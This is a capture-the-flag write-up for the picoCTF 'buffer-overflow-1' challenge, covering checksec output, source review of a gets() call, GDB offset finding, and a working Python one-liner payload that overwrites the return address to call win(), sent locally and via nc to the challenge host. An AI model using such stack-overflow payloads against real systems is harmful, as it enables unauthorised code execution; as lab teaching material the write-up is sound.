# buffer-overflow-1

## Description

Control the return address

## Enumeration

As always, lets start with some basic file enumeration:

```bash
$ file ./vuln  
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
```

The artifact is 32-bit and does not have Position Independent Executable (PIE) enabled. It is dynamically linked to libc and contains symbols.

Let's examine the artifact's security features using pwntools:

```bash
$ pwn checksec vuln                                            
[*] '/buffer-overflow-1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

There are virtually no security features enabled on this application, which means the possibilities are nearly endless!

## Code Review

We're given the source code `vuln.c`. Looking at `main`:

```c
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

We see there is a functional call to `vuln`:

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

The `vuln` function contains a `gets` call, which reveals our buffer overflow vulnerability. Now that we've identified it, we need to decide how to exploit it. Fortunately, there's a function named `win`:

```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

The `win` function loads the flag into memory and prints it to stdout. To call this function, we need to overwrite the return address with the address of `win`.

## Exploit Development

First, lets determine the offset from the return pointer:

```bash
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x08049281 <+0>:     endbr32
   0x08049285 <+4>:     push   ebp
   0x08049286 <+5>:     mov    ebp,esp
   0x08049288 <+7>:     push   ebx
   0x08049289 <+8>:     sub    esp,0x24
   0x0804928c <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049291 <+16>:    add    ebx,0x2d6f
   0x08049297 <+22>:    sub    esp,0xc
   0x0804929a <+25>:    lea    eax,[ebp-0x28]
   0x0804929d <+28>:    push   eax
   0x0804929e <+29>:    call   0x8049050 <gets@plt>
   0x080492a3 <+34>:    add    esp,0x10
   0x080492a6 <+37>:    call   0x804933e <get_return_address>
   0x080492ab <+42>:    sub    esp,0x8
   0x080492ae <+45>:    push   eax
   0x080492af <+46>:    lea    eax,[ebx-0x1f9c]
   0x080492b5 <+52>:    push   eax
   0x080492b6 <+53>:    call   0x8049040 <printf@plt>
   0x080492bb <+58>:    add    esp,0x10
   0x080492be <+61>:    nop
   0x080492bf <+62>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080492c2 <+65>:    leave
   0x080492c3 <+66>:    ret
gef➤  b *0x080492c3
Breakpoint 1 at 0x80492c3
gef➤  pattern create 128
[+] Generating a pattern of 128 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab
[+] Saved as '$_gef0'
gef➤  pattern offset $esp
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```

The offset to the return pointer is 44 bytes.

Next, we need an address to jump to. We can find this by printing the symbols of the artifact using `nm`:

```bash
$ nm ./vuln | grep "win"
080491f6 T win
```

We can craft a payload using a Python3 one-liner:

```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 144 + b"\x08\x04\x91\xf6")'
```

However, there is a problem with this payload. That's right, we didn't consider the endianess. We know from `Enumeration` that this artifact is little endian. If you don't know that that means, check out my [HTB: jeeves](https://github.com/k00l-beanz/k00l-beanz/tree/main/hackthebox/challenges/pwn/jeeves) writeup. In short, we'll need to reverse the bytes of the address:

```bash
#############################################
# Local
python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 44 + b"\xf6\x91\x04\x08")' | ./vuln
#############################################
# Remote
python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 44 + b"\xf6\x91\x04\x08" + b"\n")' | nc saturn.picoctf.net 53259
```

Which gets the flag.